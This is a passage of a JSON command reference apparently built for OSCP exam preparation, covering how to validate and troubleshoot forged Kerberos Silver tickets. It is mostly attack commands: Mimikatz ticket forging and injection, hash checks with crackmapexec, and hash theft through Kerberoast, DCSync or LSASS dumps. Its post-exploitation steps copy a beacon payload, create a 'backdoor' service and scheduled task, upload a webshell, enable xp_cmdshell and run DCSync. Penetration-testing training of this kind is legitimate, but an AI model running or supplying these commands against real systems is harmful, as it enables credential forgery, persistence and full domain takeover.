        "MSSQL validation: Login failed even with valid ticket": "DIAGNOSIS: SQL Server not trusting Kerberos ticket, or user not mapped in SQL. SOLUTIONS:\n\n1. VERIFY MSSQL SPN REGISTRATION:\n   - Run: setspn -L <sql_service_account> OR setspn -Q mssql/*\n   - Expected: MSSQLSvc/<hostname>:1433 or MSSQLSvc/<hostname>:InstanceName\n   - If missing, SQL Server may reject Kerberos auth\n\n2. CHECK SQL SERVER AUTHENTICATION MODE:\n   - SQL must allow Windows Authentication (not SQL-only mode)\n   - Connect with SSMS → Server Properties → Security → 'Windows Authentication mode' enabled\n\n3. SQL USER MAPPING:\n   - Silver ticket impersonates user (e.g., /user:admin)\n   - This user must exist as SQL login: CREATE LOGIN [CORP\\admin] FROM WINDOWS\n   - OR if using fictional user, SQL Server may reject (depends on PAC validation)\n   - FIX: Use real domain admin account name in /user parameter\n\n4. VERIFY HOSTNAME FORMAT:\n   - WRONG: Invoke-Sqlcmd -ServerInstance SQL01 (NetBIOS, may trigger NTLM)\n   - RIGHT: Invoke-Sqlcmd -ServerInstance SQL01.corp.com (FQDN, Kerberos)\n   - Alternative: Invoke-Sqlcmd -ServerInstance SQL01.corp.com,1433 (specify port)",
        "Ticket shows in klist but all access methods fail": "DIAGNOSIS: Fundamental Silver ticket creation issue (wrong hash, wrong SID, or PAC validation enabled). SOLUTIONS:\n\n1. VERIFY NTLM HASH IS CURRENT:\n   - Service account password may have changed\n   - Test hash validity: crackmapexec smb <dc_ip> -u <service_account> -H <ntlm_hash>\n   - If invalid, re-obtain hash (Kerberoast, DCSync, LSASS dump)\n\n2. VERIFY DOMAIN SID IS CORRECT:\n   - Run: whoami /user → Extract Domain SID (remove last segment)\n   - Compare with /sid parameter used in Silver ticket creation\n   - Mismatch causes KRB_AP_ERR_MODIFIED\n\n3. CHECK FOR PAC VALIDATION (rare but fatal):\n   - Modern Windows (Oct 2022 patch KB5020805) enforces PAC validation\n   - If enabled, service validates ticket with DC (verifies user exists, groups are legitimate)\n   - Silver tickets FAIL PAC validation (forged PAC doesn't match DC records)\n   - DIAGNOSIS: Event ID 4769 on DC shows PAC validation request\n   - SOLUTION: Silver tickets won't work if PAC validation enabled - use legitimate credentials or Golden ticket instead\n\n4. RECREATE TICKET WITH VERBOSE LOGGING:\n   - Mimikatz: Run with 'log <filename>.txt' first, then kerberos::golden\n   - Review log for errors during ticket construction\n   - Rubeus: Outputs detailed construction steps by default ([*] Building PAC, [*] Signing PAC, etc.)\n   - Look for errors during PAC generation or encryption"
      },
      "notes": "OSCP METHODOLOGY - VALIDATION IS MANDATORY:\nAfter creating a Silver ticket, you MUST validate access BEFORE considering the attack successful.\n\nValidation confirms:\n1.\n\nTicket was constructed correctly (right hash, SID, service type)\n2.\n\nTicket was injected properly (appears in klist AND is being used by applications)\n3.\n\nService accepts the ticket (grants expected permissions)\n\nSkipping validation wastes time during the exam - you may think you have access but actually don't, leading to failed exploitation attempts later.\n\nVALIDATION WORKFLOW (30 seconds total):\n1.\n\nCREATE SILVER TICKET:\n   mimikatz # kerberos::golden /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /rc4:<hash> /user:admin /ptt\n\n2.\n\nVERIFY TICKET IN CACHE (5 seconds):\n   klist\n   Expected output:\n   Server:\nhttp/web04.corp.com @ CORP.COM\n   KerbTicket Encryption Type:\nRSADSI RC4-HMAC(NT)\n\n3.\n\nVALIDATE SERVICE ACCESS (10-15 seconds, depending on service type):\n   \n   FOR HTTP SPN:\n   Invoke-WebRequest http://web04.corp.com -UseDefaultCredentials\n   SUCCESS:\nStatusCode = 200, Content populated\n   FAILURE:\n401/403 status, or credential prompt\n\n   FOR CIFS SPN:\n   dir \\\\web04.corp.com\\C$\n   SUCCESS:\nDirectory listing of C:\\ drive\n   FAILURE:\nAccess denied, logon failure\n\n   FOR MSSQL SPN:\n   Invoke-Sqlcmd -ServerInstance web04.corp.com -Query 'SELECT @@VERSION'\n   SUCCESS:\nSQL version string returned\n   FAILURE:\nLogin failed, server not found\n\n4.\n\nDOCUMENT SUCCESS:\n   - Record which services are accessible\n   - Note any failures for troubleshooting\n   - Proceed with exploitation (webshell upload, file exfiltration, xp_cmdshell, etc.)\n\nSERVICE-SPECIFIC VALIDATION COMMANDS:\n1.\n\nCIFS / FILE SHARES (most common):\n   # List administrative shares:\n   net view \\\\<server> /all\n   \n   # Access specific share:\n   dir \\\\<server>\\C$\n   dir \\\\<server>\\ADMIN$\n   \n   # Copy file (test write access):\n   echo test > \\\\<server>\\C$\\test.txt\n   \n   # PowerShell alternatives:\n   Get-ChildItem \\\\<server>\\C$\n   Test-Path \\\\<server>\\C$\\Windows (verify path exists)\n   \n   EXPECTED RESULT:\nFull directory listings, file operations succeed\n   TROUBLESHOOTING:\nIf access denied, verify cifs ticket exists (klist | findstr cifs)\n\n2.\n\nHTTP / IIS WEB SERVERS:\n   # PowerShell web request:\n   Invoke-WebRequest http://<server> -UseDefaultCredentials\n   \n   # Test specific path:\n   Invoke-WebRequest http://<server>/admin -UseDefaultCredentials\n   \n   # Download file:\n   Invoke-WebRequest http://<server>/data.xml -OutFile data.xml -UseDefaultCredentials\n   \n   # curl alternative (if PowerShell restricted):\n   curl --negotiate -u :\nhttp://<server>\n   \n   EXPECTED RESULT:\nHTTP 200, content retrieved, no auth prompts\n   TROUBLESHOOTING:\nIf 401/403, ensure FQDN in URL and http ticket in cache\n\n3.\n\nMSSQL / SQL SERVER:\n   # PowerShell (requires SqlServer module):\n   Import-Module SqlServer\n   Invoke-Sqlcmd -ServerInstance <server> -Query 'SELECT @@VERSION'\n   \n   # Test xp_cmdshell (if enabled):\n   Invoke-Sqlcmd -ServerInstance <server> -Query 'EXEC xp_cmdshell \"whoami\"'\n   \n   # List databases:\n   Invoke-Sqlcmd -ServerInstance <server> -Query 'SELECT name FROM sys.databases'\n   \n   # sqlcmd.exe alternative (cmd-line tool):\n   sqlcmd -S <server> -Q \"SELECT @@VERSION\"\n   \n   EXPECTED RESULT:\nQuery results returned, no login failures\n   TROUBLESHOOTING:\nIf login failed, verify mssql ticket and SQL user mapping\n\n4.\n\nLDAP / DOMAIN CONTROLLERS:\n   # PowerShell AD cmdlets (automatically use cached ticket):\n   Get-ADUser -Server <server> -Filter *\n   Get-ADComputer -Server <server> -Filter *\n   \n   # LDAP query:\n   ([adsisearcher]\"(&(objectCategory=person)(objectClass=user))\").FindAll()\n   \n   # Linux ldapsearch:\n   ldapsearch -H ldap://<server> -Y GSSAPI -b 'DC=corp,DC=com' '(objectClass=*)'\n   \n   EXPECTED RESULT:\nAD objects returned, no credential errors\n   TROUBLESHOOTING:\nRare for Silver tickets (use Golden for DC access), verify ldap ticket\n\n5.\n\nHOST / GENERIC SERVICES:\n   # WMI query (tests RPC access):\n   Get-WmiObject -Class Win32_OperatingSystem -ComputerName <server>\n   \n   # Create scheduled task (tests remote admin):\n   schtasks /create /tn test /tr calc.exe /sc once /st 23:00 /S <server>\n   \n   # Remote service enumeration:\n   Get-Service -ComputerName <server>\n   \n   EXPECTED RESULT:\nWMI data returned, tasks created, services listed\n   TROUBLESHOOTING:\nHost ticket is broad (covers multiple protocols), check specific errors\n\n6.\n\nWSMAN / POWERSHELL REMOTING:\n   # Enter remote PS session:\n   Enter-PSSession -ComputerName <server>\n   \n   # Execute remote command:\n   Invoke-Command -ComputerName <server> -ScriptBlock { whoami }\n   \n   # Test WinRM connectivity:\n   Test-WSMan <server>\n   \n   EXPECTED RESULT:\nRemote session established, commands execute\n   TROUBLESHOOTING:\nVerify wsman ticket, check WinRM enabled on target (port 5985/5986)\n\nCOMMON VALIDATION MISTAKES:\n1.\n\n❌ Using NetBIOS name instead of FQDN:\n   WRONG:\ndir \\\\WEB04\\C$ (triggers NTLM, ignores Kerberos ticket)\n   RIGHT:\ndir \\\\WEB04.corp.com\\C$ (triggers Kerberos, uses ticket)\n\n2.\n\n❌ Omitting -UseDefaultCredentials for HTTP:\n   WRONG:\nInvoke-WebRequest http://web04.corp.com (may not use ticket)\n   RIGHT:\nInvoke-WebRequest http://web04.corp.com -UseDefaultCredentials (forces ticket use)\n\n3.\n\n❌ Testing wrong service type:\n   WRONG:\nCreated http ticket, testing SMB access (dir \\\\server\\C$)\n   RIGHT:\nCreated http ticket, testing HTTP access (Invoke-WebRequest http://server)\n\n4.\n\n❌ Not checking klist first:\n   WRONG:\nAssume ticket injection worked, proceed to validation (wastes time if injection failed)\n   RIGHT:\nRun klist BEFORE validation (confirms ticket exists and is correct type)\n\n5.\n\n❌ Giving up after first failure:\n   WRONG:\nAccess denied → assume Silver ticket doesn't work\n   RIGHT:\nTroubleshoot systematically (check service type, hostname format, hash validity, SID correctness)\n\nTROUBLESHOOTING DECISION TREE:\nVALIDATION FAILED?\n├─ Ticket not in klist?\n│  ├─ /ptt failed → Re-run Mimikatz with privilege::debug first\n│  └─ Ticket creation failed → Check syntax, required parameters\n│\n├─ Ticket in klist but access denied?\n│  ├─ Check service type match (cifs ticket for SMB, http ticket for web, etc.)\n│  ├─ Verify hostname format (FQDN required for Kerberos)\n│  ├─ Test hash validity (crackmapexec smb <dc> -u <account> -H <hash>)\n│  └─ Verify Domain SID correctness (whoami /user, remove RID)\n│\n├─ Credential prompt appears?\n│  ├─ Application not using Kerberos → Use FQDN, add -UseDefaultCredentials\n│  ├─ Service prefers NTLM → Check SPN registration (setspn -Q)\n│  └─ Hostname format wrong → Match ticket hostname exactly\n│\n└─ Specific error codes?\n   ├─ KRB_AP_ERR_MODIFIED → Wrong hash or Domain SID\n   ├─ KRB_AP_ERR_NOT_US → Domain mismatch or wrong target hostname\n   ├─ Server not found → Hostname typo or DNS resolution failure\n   └─ PAC validation error → Service has PAC validation enabled (Silver won't work)\n\nPOST-VALIDATION NEXT STEPS:\nOnce validation succeeds, proceed with exploitation:\n1.\n\nCIFS ACCESS:\n   - Copy payload:\ncopy beacon.exe \\\\server\\C$\\Windows\\Temp\\\n   - PsExec:\npsexec.exe \\\\server cmd.exe\n   - Create service:\nsc \\\\server create backdoor binpath= \"C:\\Windows\\Temp\\beacon.exe\"\n   - Scheduled task:\nschtasks /create /tn backdoor /tr \"C:\\Windows\\Temp\\beacon.exe\" /sc onstart /S server\n\n2.\n\nHTTP ACCESS:\n   - Upload webshell:\nInvoke-WebRequest -Uri http://server/upload -Method POST -InFile shell.aspx -UseDefaultCredentials\n   - Access admin panel:\nhttp://server/admin (use ticket for auth)\n   - Exploit web vuln:\nUse ticket to bypass auth, then exploit SQLi/RCE/LFI\n\n3.\n\nMSSQL ACCESS:\n   - Enable xp_cmdshell:\nInvoke-Sqlcmd -Query \"EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE\"\n   - Execute commands:\nInvoke-Sqlcmd -Query \"EXEC xp_cmdshell 'whoami'\"\n   - Escalate to SYSTEM:\nxp_cmdshell runs as SQL Server service account (often high-privilege)\n\n4.\n\nLDAP ACCESS (rare for Silver, common for Golden):\n   - Enumerate AD:\nGet-ADUser -Filter * -Server <dc>\n   - Modify AD objects (if permissions allow):\nSet-ADUser, Add-ADGroupMember\n   - DCSync:\nmimikatz # lsadump::dcsync /domain:corp.com /all (requires Replication rights)\n\nTIME BUDGET FOR OSCP EXAM:\n- Ticket creation:\n1 minute\n- klist verification:\n5 seconds\n- Service validation:\n10-30 seconds (depending on service type)\n- Troubleshooting (if needed):\n2-5 minutes (systematic approach)\n- TOTAL:\n3-7 minutes from ticket creation to confirmed access\n\nIf validation takes longer than 7 minutes, consider alternative attack paths (Pass-the-Hash, legitimate credentials, different vulnerability).\n\nFINAL OSCP EXAM TIP:\nCREATE A VALIDATION CHECKLIST:\n1.\n\n[ ] klist shows ticket for correct service type (Server:\n<service>/<target>)\n2.\n\n[ ] Ticket encryption type is RC4-HMAC(NT) or AES (depending on /rc4 or /aes256)\n3.\n\n[ ] FQDN used in validation command (not NetBIOS name)\n4.\n\n[ ] Service-specific validation command executed (dir for cifs, iwr for http, etc.)\n5.\n\n[ ] SUCCESS:\nAccess granted without credential prompt\n6.\n\n[ ] FAILURE:\nTroubleshoot systematically (service type, hostname, hash, SID)\n\nThis checklist prevents common mistakes and ensures thorough validation before proceeding with exploitation.",
      "oscp_relevance": "high",
      "alternatives": [],
      "next_steps": [
        "evil-winrm-creds"
      ],
      "prerequisites": [
        "ad-silver-ticket-mimikatz-create",
        "kerberos-klist-verify"
      ],
      "filled_example": "# CIFS/SMB: dir \\\\<web04.corp.com>\\C$\n# HTTP/IIS: Invoke-WebRequest http://<web04.corp.com> -UseDefaultCredentials\n# MSSQL: Invoke-Sqlcmd -ServerInstance <web04.corp.com> -Query 'SELECT @@VERSION'\n# LDAP: ldapsearch -H ldap://<web04.corp.com> -Y GSSAPI -b 'DC=corp,DC=com'"
    }
  ]
}